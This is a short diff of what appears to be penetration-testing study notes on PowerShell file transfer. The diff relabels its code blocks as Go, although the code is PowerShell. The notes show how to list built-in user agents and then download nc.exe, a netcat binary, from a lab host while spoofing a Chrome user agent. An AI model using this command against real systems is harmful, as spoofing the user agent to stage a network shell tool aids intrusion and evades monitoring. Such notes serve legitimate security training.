@@ -2,17 +2,17 @@ Invoke-WebRequest contains a UserAgent parameter, which allows for changing the 
 
 **Listing User Agents**
 
-```
+```go
 [Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
 ```
 
 Invoking Invoke-WebRequest to download nc.exe using a Chrome User Agent:
 
 **Request with Chrome User Agent**
-```
+```go
 $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
 ```
-```
+```go
 Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
 ```
 
